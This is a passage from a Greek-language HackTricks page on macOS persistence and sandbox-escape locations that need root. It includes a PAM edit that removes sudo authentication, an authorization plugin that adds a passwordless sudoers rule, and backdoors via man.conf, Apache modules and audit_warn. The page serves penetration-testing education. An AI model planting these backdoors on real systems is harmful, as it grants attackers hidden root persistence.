* Χρήσιμο για να παρακάμψει το sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Χρειάζεται μια συγκεκριμένη ενέργεια χρήστη
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Περιγραφή

Δεν φαίνεται να λειτουργεί πια.

## Παράκαμψη Sandbox Root

{% hint style="success" %}
Εδώ μπορείτε να βρείτε τοποθεσίες εκκίνησης χρήσιμες για **παράκαμψη sandbox** που σας επιτρέπουν να εκτελέσετε κάτι απλά **γράφοντας το σε ένα αρχείο** ως **root** και/ή απαιτώντας άλλες **παράξενες συνθήκες.**
{% endhint %}

### Περιοδικά

Writeup: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Χρήσιμο για να παρακάμψει το sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Αλλά πρέπει να είστε root
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Απαιτείται root
* **Trigger**: Όταν έρθει η ώρα
* `/etc/daily.local`, `/etc/weekly.local` ή `/etc/monthly.local`
* Απαιτείται root
* **Trigger**: Όταν έρθει η ώρα

#### Περιγραφή & Εκμετάλλευση

Τα περιοδικά scripts (**`/etc/periodic`**) εκτελούνται λόγω των **launch daemons** που είναι ρυθμισμένα στο `/System/Library/LaunchDaemons/com.apple.periodic*`. Σημειώστε ότι τα scripts που αποθηκεύονται στο `/etc/periodic/` εκτελούνται ως **ο ιδιοκτήτης του αρχείου,** επομένως αυτό δεν θα λειτουργήσει για μια πιθανή κλιμάκωση προνομίων.

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

Υπάρχουν άλλα περιοδικά σενάρια που θα εκτελούνται όπως υποδεικνύεται στο **`/etc/defaults/periodic.conf`**:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Αν καταφέρετε να γράψετε οποιοδήποτε από τα αρχεία `/etc/daily.local`, `/etc/weekly.local` ή `/etc/monthly.local`, θα **εκτελούνται sooner or later**.

{% hint style="warning" %}
Σημειώστε ότι το περιοδικό σενάριο θα **εκτελείται ως ο ιδιοκτήτης του σεναρίου**. Έτσι, αν ένας κανονικός χρήστης είναι ο ιδιοκτήτης του σεναρίου, θα εκτελείται ως αυτός ο χρήστης (αυτό μπορεί να αποτρέψει επιθέσεις ανύψωσης προνομίων).
{% endhint %}

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

* Χρήσιμο για να παρακάμψετε το sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Αλλά χρειάζεστε να είστε root
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

* Απαιτείται πάντα root

#### Περιγραφή & Εκμετάλλευση

Καθώς το PAM είναι πιο επικεντρωμένο στην **επιμονή** και το κακόβουλο λογισμικό παρά στην εύκολη εκτέλεση μέσα στο macOS, αυτό το blog δεν θα δώσει λεπτομερή εξήγηση, **διαβάστε τα writeups για να κατανοήσετε καλύτερα αυτή την τεχνική**.

Ελέγξτε τα PAM modules με:
```bash
ls -l /etc/pam.d
```
Μια τεχνική επιμονής/κλιμάκωσης προνομίων που εκμεταλλεύεται το PAM είναι τόσο εύκολη όσο η τροποποίηση της μονάδας /etc/pam.d/sudo προσθέτοντας στην αρχή τη γραμμή:
```bash
auth       sufficient     pam_permit.so
```
Έτσι θα **φαίνεται** κάτι σαν αυτό:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Και επομένως, οποιαδήποτε προσπάθεια να χρησιμοποιηθεί **`sudo` θα λειτουργήσει**.

{% hint style="danger" %}
Σημειώστε ότι αυτός ο φάκελος προστατεύεται από TCC, οπότε είναι πολύ πιθανό ο χρήστης να λάβει μια προτροπή ζητώντας πρόσβαση.
{% endhint %}

Ένα άλλο ωραίο παράδειγμα είναι το su, όπου μπορείτε να δείτε ότι είναι επίσης δυνατό να δώσετε παραμέτρους στα PAM modules (και μπορείτε επίσης να κάνετε backdoor αυτό το αρχείο):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

* Χρήσιμο για να παρακάμψετε το sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Αλλά χρειάζεστε να είστε root και να κάνετε επιπλέον ρυθμίσεις
* TCC bypass: ???

#### Location

* `/Library/Security/SecurityAgentPlugins/`
* Απαιτείται root
* Είναι επίσης απαραίτητο να ρυθμίσετε τη βάση δεδομένων εξουσιοδότησης για να χρησιμοποιήσετε το plugin

#### Description & Exploitation

Μπορείτε να δημιουργήσετε ένα plugin εξουσιοδότησης που θα εκτελείται όταν ένας χρήστης συνδέεται για να διατηρήσει την επιμονή. Για περισσότερες πληροφορίες σχετικά με το πώς να δημιουργήσετε ένα από αυτά τα plugins, ελέγξτε τις προηγούμενες αναφορές (και να είστε προσεκτικοί, ένα κακώς γραμμένο μπορεί να σας κλειδώσει έξω και θα χρειαστεί να καθαρίσετε το mac σας από τη λειτουργία ανάκτησης).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Μεταφέρετε** το πακέτο στην τοποθεσία που θα φορτωθεί:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Τέλος, προσθέστε τον **κανόνα** για να φορτώσετε αυτό το Plugin:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Το **`evaluate-mechanisms`** θα ενημερώσει το πλαίσιο εξουσιοδότησης ότι θα χρειαστεί να **καλέσει έναν εξωτερικό μηχανισμό για εξουσιοδότηση**. Επιπλέον, το **`privileged`** θα το εκτελέσει ως root.

Trigger it with:
```bash
security authorize com.asdf.asdf
```
And then the **staff group should have sudo** access (read `/etc/sudoers` to confirm).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

* Χρήσιμο για να παρακάμψετε το sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Αλλά πρέπει να είστε root και ο χρήστης πρέπει να χρησιμοποιεί man
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* **`/private/etc/man.conf`**
* Απαιτείται root
* **`/private/etc/man.conf`**: Όποτε χρησιμοποιείται το man

#### Description & Exploit

Το αρχείο ρυθμίσεων **`/private/etc/man.conf`** υποδεικνύει το δυαδικό/σενάριο που θα χρησιμοποιηθεί κατά το άνοιγμα αρχείων τεκμηρίωσης man. Έτσι, η διαδρομή προς το εκτελέσιμο θα μπορούσε να τροποποιηθεί ώστε κάθε φορά που ο χρήστης χρησιμοποιεί το man για να διαβάσει κάποια έγγραφα, να εκτελείται μια backdoor.

Για παράδειγμα, ορίστε στο **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
Και στη συνέχεια δημιουργήστε το `/tmp/view` ως:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

* Χρήσιμο για να παρακάμψει το sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Αλλά χρειάζεσαι δικαιώματα root και ο apache πρέπει να είναι σε λειτουργία
* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
* Το httpd δεν έχει δικαιώματα

#### Location

* **`/etc/apache2/httpd.conf`**
* Απαιτείται root
* Trigger: Όταν ξεκινά ο Apache2

#### Description & Exploit

Μπορείς να υποδείξεις στο `/etc/apache2/httpd.conf` να φορτώσει ένα module προσθέτοντας μια γραμμή όπως: 

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

Με αυτόν τον τρόπο, τα συμπιεσμένα σας modules θα φορτωθούν από τον Apache. Το μόνο που χρειάζεται είναι είτε να **το υπογράψετε με ένα έγκυρο πιστοποιητικό της Apple**, είτε να **προσθέσετε ένα νέο έμπιστο πιστοποιητικό** στο σύστημα και να **το υπογράψετε** με αυτό.

Στη συνέχεια, αν χρειαστεί, για να βεβαιωθείτε ότι ο διακομιστής θα ξεκινήσει, μπορείτε να εκτελέσετε:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Κωδικός παράδειγμα για το Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Χρήσιμο για να παρακάμψετε το sandbox: [🟠](https://emojipedia.org/large-orange-circle)
* Αλλά χρειάζεστε δικαιώματα root, το auditd να είναι σε εκτέλεση και να προκαλέσει προειδοποίηση
* Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Location

* **`/etc/security/audit_warn`**
* Απαιτείται root
* **Trigger**: Όταν το auditd ανιχνεύει μια προειδοποίηση

#### Description & Exploit

Όποτε το auditd ανιχνεύει μια προειδοποίηση, το σενάριο **`/etc/security/audit_warn`** είναι **εκτελούμενο**. Έτσι, μπορείτε να προσθέσετε το payload σας σε αυτό.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
You could force a warning with `sudo audit -n`.

### Startup Items

{% hint style="danger" %}
**Αυτό είναι παρωχημένο, οπότε δεν θα πρέπει να βρεθεί τίποτα σε αυτούς τους καταλόγους.**
{% endhint %}

Το **StartupItem** είναι ένας κατάλογος που θα πρέπει να τοποθετείται είτε μέσα στο `/Library/StartupItems/` είτε στο `/System/Library/StartupItems/`. Μόλις δημιουργηθεί αυτός ο κατάλογος, πρέπει να περιλαμβάνει δύο συγκεκριμένα αρχεία:

1. Ένα **rc script**: Ένα shell script που εκτελείται κατά την εκκίνηση.
2. Ένα **plist file**, συγκεκριμένα ονομαζόμενο `StartupParameters.plist`, το οποίο περιέχει διάφορες ρυθμίσεις παραμετροποίησης.

Βεβαιωθείτε ότι τόσο το rc script όσο και το αρχείο `StartupParameters.plist` είναι σωστά τοποθετημένα μέσα στον κατάλογο **StartupItem** ώστε η διαδικασία εκκίνησης να τα αναγνωρίσει και να τα χρησιμοποιήσει.

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="superservicename" %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
Δεν μπορώ να βρω αυτό το συστατικό στο macOS μου, οπότε για περισσότερες πληροφορίες ελέγξτε την αναφορά
{% endhint %}

Αναφορά: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Εισήχθη από την Apple, **emond** είναι ένας μηχανισμός καταγραφής που φαίνεται να είναι υποανάπτυκτος ή πιθανώς εγκαταλειμμένος, ωστόσο παραμένει προσβάσιμος. Ενώ δεν είναι ιδιαίτερα ωφέλιμος για έναν διαχειριστή Mac, αυτή η ασαφής υπηρεσία θα μπορούσε να χρησιμεύσει ως μια διακριτική μέθοδος επιμονής για τους απειλητικούς παράγοντες, πιθανώς απαρατήρητη από τους περισσότερους διαχειριστές macOS.

Για όσους γνωρίζουν την ύπαρξή του, η αναγνώριση οποιασδήποτε κακόβουλης χρήσης του **emond** είναι απλή. Το LaunchDaemon του συστήματος για αυτή την υπηρεσία αναζητά σενάρια προς εκτέλεση σε έναν μόνο φάκελο. Για να το ελέγξετε, μπορεί να χρησιμοποιηθεί η παρακάτω εντολή:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Location

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Απαιτείται δικαιώματα root
* **Trigger**: Με το XQuartz

#### Description & Exploit

Το XQuartz **δεν είναι πλέον εγκατεστημένο στο macOS**, οπότε αν θέλετε περισσότερες πληροφορίες ελέγξτε την αναφορά.

### ~~kext~~

{% hint style="danger" %}
Είναι τόσο περίπλοκο να εγκαταστήσετε kext ακόμα και ως root που δεν θα το θεωρήσω αυτό για να ξεφύγω από sandbox ή ακόμα και για επιμονή (εκτός αν έχετε ένα exploit)
{% endhint %}

#### Location

Για να εγκαταστήσετε ένα KEXT ως στοιχείο εκκίνησης, πρέπει να είναι **εγκατεστημένο σε μία από τις παρακάτω τοποθεσίες**:

* `/System/Library/Extensions`
* Αρχεία KEXT ενσωματωμένα στο λειτουργικό σύστημα OS X.
* `/Library/Extensions`
* Αρχεία KEXT που εγκαθίστανται από λογισμικό τρίτων

Μπορείτε να καταγράψετε τα τρέχοντα φορτωμένα αρχεία kext με:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Για περισσότερες πληροφορίες σχετικά με [**τον έλεγχο των kernel extensions δείτε αυτή την ενότητα**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Τοποθεσία

* **`/usr/local/bin/amstoold`**
* Απαιτείται δικαιώματα root

#### Περιγραφή & Εκμετάλλευση

Φαίνεται ότι το `plist` από το `/System/Library/LaunchAgents/com.apple.amstoold.plist` χρησιμοποιούσε αυτό το δυαδικό αρχείο ενώ εκθέτοντας μια υπηρεσία XPC... το θέμα είναι ότι το δυαδικό αρχείο δεν υπήρχε, οπότε θα μπορούσατε να τοποθετήσετε κάτι εκεί και όταν καλείται η υπηρεσία XPC, το δυαδικό σας αρχείο θα καλείται.

Δεν μπορώ πλέον να το βρω στο macOS μου.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Τοποθεσία

* **`/Library/Preferences/Xsan/.xsanrc`**
* Απαιτείται δικαιώματα root
* **Trigger**: Όταν εκτελείται η υπηρεσία (σπάνια)

#### Περιγραφή & εκμετάλλευση

Φαίνεται ότι δεν είναι πολύ συνηθισμένο να εκτελείται αυτό το σενάριο και δεν μπόρεσα καν να το βρω στο macOS μου, οπότε αν θέλετε περισσότερες πληροφορίες ελέγξτε το writeup.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Αυτό δεν λειτουργεί σε σύγχρονες εκδόσεις του MacOS**
{% endhint %}

Είναι επίσης δυνατό να τοποθετήσετε εδώ **εντολές που θα εκτελούνται κατά την εκκίνηση.** Παράδειγμα κανονικού σεναρίου rc.common:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Τεχνικές και εργαλεία επιμονής

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
